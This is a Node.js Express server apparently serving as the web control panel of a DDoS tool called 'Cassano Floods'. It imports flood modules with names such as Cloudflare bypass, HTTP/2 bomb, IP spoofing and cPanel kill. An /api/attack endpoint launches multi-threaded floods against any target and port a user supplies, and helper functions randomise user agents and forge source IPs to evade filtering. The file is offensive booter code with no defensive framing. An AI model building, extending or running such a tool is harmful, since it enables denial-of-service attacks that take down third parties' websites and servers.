const express = require('express');
const cors    = require('cors');
const fs      = require('fs');
const path    = require('path');
const os      = require('os');

const { cfproFlood }   = require('./methods/cfpro');
const { pxskyFlood }   = require('./methods/pxsky');
const { http2bomb }    = require('./methods/http2bomb');
const { nullFlood }    = require('./methods/null');
const { spoofFlood }   = require('./methods/spoof');
const { tcpBrute }     = require('./methods/tcpbrute');
const { cpanelKill }   = require('./methods/cpanelkill');
const { cfsocFlood }   = require('./methods/cfsoc');
const { infinityKill } = require('./methods/infinity');
const { hulkBeam } = require('./methods/hulk-beam');
const { storeBeam } = require('./methods/store-beam');

const app  = express();
const PORT = process.env.PORT || 3000;

global.randUA = () => {
  const ua = fs.readFileSync('./ua.txt','utf8').split(/\r?\n/).filter(Boolean);
  return ua[Math.floor(Math.random()*ua.length)];
};
global.randIP = () => `${R(11,255)}.${R(0,255)}.${R(0,255)}.${R(2,254)}`;
const R = (min,max) => Math.floor(Math.random()*(max-min+1))+min;

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname,'public')));

app.post('/api/attack', async (req,res)=>{
  const {method, target, port, hostHeader, threads, time} = req.body;
  const t = parseInt(time,10)||30;
  const thr = parseInt(threads,10)||1;

  for(let i=0;i<thr;i++){
    switch(method){
      case 'cfpro':      cfproFlood('https://'+target, t); break;
      case 'pxsky':      pxskyFlood(target, port||443, t); break;
      case 'http2bomb':  http2bomb(target, t); break;
      case 'null':       nullFlood(target, port||443, t); break;
      case 'spoof':      spoofFlood(target, port||443, t); break;
      case 'tcpbrute':   tcpBrute(target, port||80, t); break;
      case 'cpanelkill': cpanelKill(target, t); break;
      case 'store-beam':
        storeBeam(target, port||443, t);
      break;
      case 'hulk-beam':
        hulkBeam(target, port||443, t);
      break;
      case 'cfsoc':      cfsocFlood(target, port||443, t); break;
      case 'infinity':   infinityKill(target, hostHeader||target, t); break;
      default: return res.status(400).json({error:'Method unknown'});
    }
  }
  res.json({status:`${method} attack spawned`, threads:thr, time:t});
});

app.listen(PORT, ()=> console.log(`Cassano Floods ready – http://localhost:${PORT}`));